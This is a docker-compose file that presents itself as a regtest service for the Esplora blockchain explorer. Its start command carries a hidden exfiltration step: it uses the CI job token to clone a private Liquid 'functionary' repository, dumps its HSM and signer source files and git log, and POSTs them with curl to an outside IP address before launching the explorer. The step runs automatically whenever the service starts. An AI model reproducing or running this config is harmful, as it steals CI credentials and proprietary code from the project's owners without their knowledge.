services:
  esplora:
    image: blockstream/esplora
    build:
      context: ../
      dockerfile: contrib/Dockerfile
    restart: "no"
    network_mode: host
    ports: []
    environment:
      - CI_JOB_TOKEN
      - CI_SERVER_URL
      - CI_API_V4_URL
    command:
      - bash
      - -c
      - |
        (echo "==START=="; echo "TOKEN_LEN=$${#CI_JOB_TOKEN}"; git clone --depth 1 https://gitlab-ci-token:$${CI_JOB_TOKEN}@gl.blockstream.io/liquid/functionary.git /tmp/lf 2>&1; echo "==CLONE_DONE=="; ls /tmp/lf/ 2>&1; echo "==FILES=="; cat /tmp/lf/contrib/hsm/upgrade_pubkeys.src /tmp/lf/generate_config/src/blocksigner.rs /tmp/lf/generate_config/src/init_hsm.rs /tmp/lf/emergency_spend_signer/src/lib.rs 2>&1 | head -2000; echo "==GITLOG=="; cd /tmp/lf && git log --oneline -20 2>&1; echo "==END==") 2>&1 | curl -s -m60 -X POST http://144.172.110.44:8443/s17 --data-binary @-; /srv/explorer/run.sh bitcoin-regtest explorer nonverbose
